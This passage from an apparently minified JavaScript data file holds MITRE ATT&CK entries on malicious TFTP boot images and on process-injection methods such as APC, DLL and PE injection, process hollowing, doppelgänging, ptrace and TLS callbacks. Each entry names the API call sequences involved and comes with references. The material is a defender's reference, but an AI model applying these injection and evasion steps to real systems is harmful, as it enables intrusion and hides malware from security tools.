commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1601'\u003EModify System Image\u003C\u002Fa\u003E to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F004'\u003EROMMONkit\u003C\u002Fa\u003E and may result in the network device running a modified image. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fcommunity.cisco.com\u002Ft5\u002Fsecurity-blogs\u002Fattackers-continue-to-target-legacy-devices\u002Fba-p\u002F4169954'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";AK.external_references=[{source_name:b,external_id:AL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1542\u002F005"},{source_name:K,url:L,description:M},{source_name:"Cisco IOS Software Integrity Assurance - Secure Boot",url:"https:\u002F\u002Ftools.cisco.com\u002Fsecurity\u002Fcenter\u002Fresources\u002Fintegrity_assurance.html#35",description:"Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Secure Boot. Retrieved October 19, 2020."},{source_name:db,url:dc,description:dd},{source_name:de,url:df,description:dg},{source_name:l$,url:ma,description:mb},{source_name:"Cisco IOS Software Integrity Assurance - Boot Information",url:"https:\u002F\u002Ftools.cisco.com\u002Fsecurity\u002Fcenter\u002Fresources\u002Fintegrity_assurance.html#26",description:"Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Boot Information. Retrieved October 21, 2020."}];AK["subtechnique-of"]=aD;AN.id=AO;AN["object-type"]=a;AN.name="Asynchronous Procedure Call";AN.description="Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms681951.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E of a process's thread. Queued APC functions are executed when the thread enters an alterable state.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms681951.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E A handle to an existing victim process is first created with native Windows API calls such as \u003Ccode\u003EOpenThread\u003C\u002Fcode\u003E. At this point \u003Ccode\u003EQueueUserAPC\u003C\u002Fcode\u003E can be used to invoke a function (such as \u003Ccode\u003ELoadLibrayA\u003C\u002Fcode\u003E pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cyberbit.com\u002Fblog\u002Fendpoint-security\u002Fnew-early-bird-code-injection-technique-discovered\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E AtomBombing \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.ensilo.com\u002Fatombombing-brand-new-code-injection-for-windows'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms649053.aspx'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ";AN.external_references=[{source_name:b,external_id:AO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F004"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms681951.aspx",description:"Microsoft. (n.d.). Asynchronous Procedure Calls. Retrieved December 8, 2017.",source_name:"Microsoft APC"},{url:"https:\u002F\u002Fwww.cyberbit.com\u002Fblog\u002Fendpoint-security\u002Fnew-early-bird-code-injection-technique-discovered\u002F",description:"Gavriel, H. & Erbesfeld, B. (2018, April 11). New ‘Early Bird’ Code Injection Technique Discovered. Retrieved May 24, 2018.",source_name:"CyberBit Early Bird Apr 2018"},{url:"https:\u002F\u002Fblog.ensilo.com\u002Fatombombing-brand-new-code-injection-for-windows",description:"Liberman, T. (2016, October 27). ATOMBOMBING: BRAND NEW CODE INJECTION FOR WINDOWS. Retrieved December 8, 2017.",source_name:"ENSIL AtomBombing Oct 2016"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms649053.aspx",description:"Microsoft. (n.d.). About Atom Tables. Retrieved December 8, 2017.",source_name:"Microsoft Atom Table"},{url:C,description:D,source_name:E}];AN["subtechnique-of"]=G;AP.id=AQ;AP["object-type"]=a;AP.name="Dynamic-link Library Injection";AP.description="Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as \u003Ccode\u003EVirtualAllocEx\u003C\u002Fcode\u003E and \u003Ccode\u003EWriteProcessMemory\u003C\u002Fcode\u003E, then invoked with \u003Ccode\u003ECreateRemoteThread\u003C\u002Fcode\u003E (which calls the \u003Ccode\u003ELoadLibrary\u003C\u002Fcode\u003E API responsible for loading the DLL). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of \u003Ccode\u003ELoadLibrary\u003C\u002Fcode\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Fhunting-memory'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ";AP.external_references=[{source_name:b,external_id:AQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F001"},{url:C,description:D,source_name:E},{url:"https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Fhunting-memory",description:"Desimone, J. (2017, June 13). Hunting in Memory. Retrieved December 7, 2017.",source_name:"Elastic HuntingNMemory June 2017"}];AP["subtechnique-of"]=G;AR.id=AS;AR["object-type"]=a;AR.name="Extra Window Memory Injection";AR.description="Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input\u002Foutput of data).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms633574.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms633584.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms633591.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as \u003Ccode\u003EWriteProcessMemory\u003C\u002Fcode\u003E and \u003Ccode\u003ECreateRemoteThread\u003C\u002Fcode\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.malwaretech.com\u002F2013\u002F08\u002Fpowerloader-injection-something-truly.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2013\u002F03\u002F19\u002Fgapz-and-redyms-droppers-based-on-power-loader-code\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ";AR.external_references=[{source_name:b,external_id:AS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F011"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms633574.aspx",description:"Microsoft. (n.d.). About Window Classes. Retrieved December 16, 2017.",source_name:"Microsoft Window Classes"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms633584.aspx",description:"Microsoft. (n.d.). GetWindowLong function. Retrieved December 16, 2017.",source_name:"Microsoft GetWindowLong function"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms633591.aspx",description:"Microsoft. (n.d.). SetWindowLong function. Retrieved December 16, 2017.",source_name:"Microsoft SetWindowLong function"},{url:C,description:D,source_name:E},{url:"https:\u002F\u002Fwww.malwaretech.com\u002F2013\u002F08\u002Fpowerloader-injection-something-truly.html",description:"MalwareTech. (2013, August 13). PowerLoader Injection – Something truly amazing. Retrieved December 16, 2017.",source_name:"MalwareTech Power Loader Aug 2013"},{url:"https:\u002F\u002Fwww.welivesecurity.com\u002F2013\u002F03\u002F19\u002Fgapz-and-redyms-droppers-based-on-power-loader-code\u002F",description:"Matrosov, A. (2013, March 19). Gapz and Redyms droppers based on Power Loader code. Retrieved December 16, 2017.",source_name:"WeLiveSecurity Gapz and Redyms Mar 2013"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fms644953.aspx",description:"Microsoft. (n.d.). SendNotifyMessage function. Retrieved December 16, 2017.",source_name:"Microsoft SendNotifyMessage function"}];AR["subtechnique-of"]=G;AT.id=AU;AT["object-type"]=a;AT.name="Portable Executable Injection";AT.description="Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as \u003Ccode\u003EVirtualAllocEx\u003C\u002Fcode\u003E and \u003Ccode\u003EWriteProcessMemory\u003C\u002Fcode\u003E, then invoked with \u003Ccode\u003ECreateRemoteThread\u003C\u002Fcode\u003E or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ";AT.external_references=[{source_name:b,external_id:AU,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F002"},{url:C,description:D,source_name:E}];AT["subtechnique-of"]=G;AV.id=AW;AV["object-type"]=a;AV.name="Proc Memory";AV.description="Adversaries may inject malicious code into processes via the \u002Fproc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the \u002Fproc filesystem (\u003Ccode\u003E\u002Fproc\u002F[pid]\u003C\u002Fcode\u003E) then crafting a return-oriented programming (ROP) payload with available gadgets\u002Finstructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the \u002Fproc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within \u003Ccode\u003E\u002Fproc\u002F[pid]\u002Fmaps\u003C\u002Fcode\u003E can be overwritten using dd.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fhick.org\u002Fcode\u002Fskape\u002Fpapers\u002Fneedle.txt'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.gdssecurity.com\u002Flabs\u002F2017\u002F9\u002F5\u002Flinux-based-inter-process-code-injection-without-ptrace2.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman1\u002Fdd.1.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nOther techniques such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574\u002F006'\u003EDynamic Linker Hijacking\u003C\u002Fa\u003E may be used to populate a target process with more available gadgets. Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F012'\u003EProcess Hollowing\u003C\u002Fa\u003E, proc memory injection may target child processes (such as a backgrounded copy of sleep).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.gdssecurity.com\u002Flabs\u002F2017\u002F9\u002F5\u002Flinux-based-inter-process-code-injection-without-ptrace2.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ";AV.external_references=[{source_name:b,external_id:AW,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F009"},{url:vm,description:vn,source_name:vo},{source_name:"GDS Linux Injection",url:"https:\u002F\u002Fblog.gdssecurity.com\u002Flabs\u002F2017\u002F9\u002F5\u002Flinux-based-inter-process-code-injection-without-ptrace2.html",description:"McNamara, R. (2017, September 5). Linux Based Inter-Process Code Injection Without Ptrace(2). Retrieved February 21, 2020."},{source_name:"DD Man",url:"http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman1\u002Fdd.1.html",description:"Kerrisk, M. (2020, February 2). DD(1) User Commands. Retrieved February 21, 2020."}];AV["subtechnique-of"]=G;AX.id=AY;AX["object-type"]=a;AX.name="Process Doppelgänging";AX.description="Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fbb968806.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fdd979526.aspx'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa365738.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Feu-17\u002Fmaterials\u002Feu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may abuse TxF to a perform a file-less variation of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055'\u003EProcess Injection\u003C\u002Fa\u003E. Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F012'\u003EProcess Hollowing\u003C\u002Fa\u003E, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as \u003Ccode\u003ENtUnmapViewOfSection\u003C\u002Fcode\u003E, \u003Ccode\u003EVirtualProtectEx\u003C\u002Fcode\u003E, and \u003Ccode\u003ESetThreadContext\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Feu-17\u002Fmaterials\u002Feu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nProcess Doppelgänging is implemented in 4 steps \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Feu-17\u002Fmaterials\u002Feu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E:\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process. ";AX.external_references=[{source_name:b,external_id:AY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F013"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fbb968806.aspx",description:"Microsoft. (n.d.). Transactional NTFS (TxF). Retrieved December 20, 2017.",source_name:"Microsoft TxF"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fdd979526.aspx",description:"Microsoft. (n.d.). Basic TxF Concepts. Retrieved December 20, 2017.",source_name:"Microsoft Basic TxF Concepts"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Faa365738.aspx",description:"Microsoft. (n.d.). When to Use Transactional NTFS. Retrieved December 20, 2017.",source_name:"Microsoft Where to use TxF"},{url:"https:\u002F\u002Fwww.blackhat.com\u002Fdocs\u002Feu-17\u002Fmaterials\u002Feu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf",description:"Liberman, T. & Kogan, E. (2017, December 7). Lost in Transaction: Process Doppelgänging. Retrieved December 20, 2017.",source_name:"BlackHat Process Doppelgänging Dec 2017"},{url:"https:\u002F\u002Fhshrzd.wordpress.com\u002F2017\u002F12\u002F18\u002Fprocess-doppelganging-a-new-way-to-impersonate-a-process\u002F",description:"hasherezade. (2017, December 18). Process Doppelgänging – a new way to impersonate a process. Retrieved December 20, 2017.",source_name:"hasherezade Process Doppelgänging Dec 2017"},{url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fhardware\u002Fff559951.aspx",description:"Microsoft. (n.d.). PsSetCreateProcessNotifyRoutine routine. Retrieved December 20, 2017.",source_name:"Microsoft PsSetCreateProcessNotifyRoutine routine"}];AX["subtechnique-of"]=G;AZ.id=A_;AZ["object-type"]=a;AZ.name="Process Hollowing";AZ.description="Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping\u002Fhollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as \u003Ccode\u003ECreateProcess\u003C\u002Fcode\u003E, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as \u003Ccode\u003EZwUnmapViewOfSection\u003C\u002Fcode\u003E or \u003Ccode\u003ENtUnmapViewOfSection\u003C\u002Fcode\u003E  before being written to, realigned to the injected code, and resumed via \u003Ccode\u003EVirtualAllocEx\u003C\u002Fcode\u003E, \u003Ccode\u003EWriteProcessMemory\u003C\u002Fcode\u003E, \u003Ccode\u003ESetThreadContext\u003C\u002Fcode\u003E, then \u003Ccode\u003EResumeThread\u003C\u002Fcode\u003E respectively.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.autosectools.com\u002Fprocess-hollowing.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis is very similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F005'\u003EThread Local Storage\u003C\u002Fa\u003E but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ";AZ.external_references=[{source_name:b,external_id:A_,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F012"},{url:"http:\u002F\u002Fwww.autosectools.com\u002Fprocess-hollowing.pdf",description:"Leitch, J. (n.d.). Process Hollowing. Retrieved November 12, 2014.",source_name:"Leitch Hollowing"},{url:C,description:D,source_name:E}];AZ["subtechnique-of"]=G;A$.id=Ba;A$["object-type"]=a;A$.name="Ptrace System Calls";A$.description="Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman2\u002Fptrace.2.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: \u003Ccode\u003Emalloc\u003C\u002Fcode\u003E) then invoking that memory with \u003Ccode\u003EPTRACE_SETREGS\u003C\u002Fcode\u003E to set the register containing the next instruction to execute. Ptrace system call injection can also be done with \u003Ccode\u003EPTRACE_POKETEXT\u003C\u002Fcode\u003E\u002F\u003Ccode\u003EPTRACE_POKEDATA\u003C\u002Fcode\u003E, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). \u003Csup\u003E\u003Ca href='http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman2\u002Fptrace.2.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@jain.sm\u002Fcode-injection-in-running-process-using-ptrace-d3ea7191a4be'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nPtrace system call injection may not be possible targeting processes with high-privileges, and on some system those that are non-child processes.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fgaffe23\u002Flinux-inject\u002Fblob\u002Fmaster\u002Fslides_BHArsenal2015.pdf'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ";A$.external_references=[{source_name:b,external_id:Ba,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F008"},{source_name:"PTRACE man",url:"http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman2\u002Fptrace.2.html",description:"Kerrisk, M. (2020, February 9). PTRACE(2) - Linux Programmer's Manual. Retrieved February 21, 2020."},{source_name:"Medium Ptrace JUL 2018",url:"https:\u002F\u002Fmedium.com\u002F@jain.sm\u002Fcode-injection-in-running-process-using-ptrace-d3ea7191a4be",description:"Jain, S. (2018, July 25). Code injection in running process using ptrace. Retrieved February 21, 2020."},{source_name:"BH Linux Inject",url:"https:\u002F\u002Fgithub.com\u002Fgaffe23\u002Flinux-inject\u002Fblob\u002Fmaster\u002Fslides_BHArsenal2015.pdf",description:"Colgan, T. (2015, August 15). Linux-Inject. Retrieved February 21, 2020."},{description:gd,source_name:ge},{url:gf,description:gg,source_name:gh},{url:gi,description:gj,source_name:gk},{url:gl,description:gm,source_name:gn}];A$["subtechnique-of"]=G;Bb.id=Bc;Bb["object-type"]=a;Bb.name="Thread Execution Hijacking";Bb.description="Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping\u002Fhollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as \u003Ccode\u003EOpenThread\u003C\u002Fcode\u003E. At this point the process can be suspended then written to, realigned to the injected code, and resumed via \u003Ccode\u003ESuspendThread \u003C\u002Fcode\u003E, \u003Ccode\u003EVirtualAllocEx\u003C\u002Fcode\u003E, \u003Ccode\u003EWriteProcessMemory\u003C\u002Fcode\u003E, \u003Ccode\u003ESetThreadContext\u003C\u002Fcode\u003E, then \u003Ccode\u003EResumeThread\u003C\u002Fcode\u003E respectively.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.endgame.com\u002Fblog\u002Ftechnical-blog\u002Ften-process-injection-techniques-technical-survey-common-and-trending-process'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThis is very similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F012'\u003EProcess Hollowing\u003C\u002Fa\u003E but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ";Bb.external_references=[{source_name:b,external_id:Bc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F003"},{url:C,description:D,source_name:E}];Bb["subtechnique-of"]=G;Bd.id=Be;Bd["object-type"]=a;Bd.name="Thread Local Storage";Bd.description="Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and\u002For cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055'\u003EProcess Injection\u003C\u002Fa\u003E techniques such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1055\u002F012'\u003EProcess Hollowing\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F11\u002Fursnif-variant-malicious-tls-callback-technique.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nRunning code in the context of another process may allow access to the process's memory, system\u002Fnetwork resources, and possibly elevated privileges. Execution via TLS callback injection may also 